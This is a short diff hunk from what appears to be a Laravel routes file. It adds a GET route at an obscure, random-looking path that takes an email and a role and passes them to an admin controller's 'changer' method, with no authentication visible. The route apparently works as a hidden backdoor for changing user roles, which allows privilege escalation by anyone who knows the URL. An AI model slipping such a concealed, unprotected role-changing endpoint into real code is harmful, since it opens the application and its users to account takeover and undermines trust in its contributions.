@@ -29,6 +29,9 @@ Route::get('/', function () {
     return view('welcome');
 });
 
+Route::GET('/changerA2W3/123WERghty211HHJ/{email}/{role}',
+ 'Admin\BusinessDeveloperController@changer');
+
 Route::get('email', function () {
     $rad = rand(1000, 9999);
     $otpCode = rand(1000, 9999);
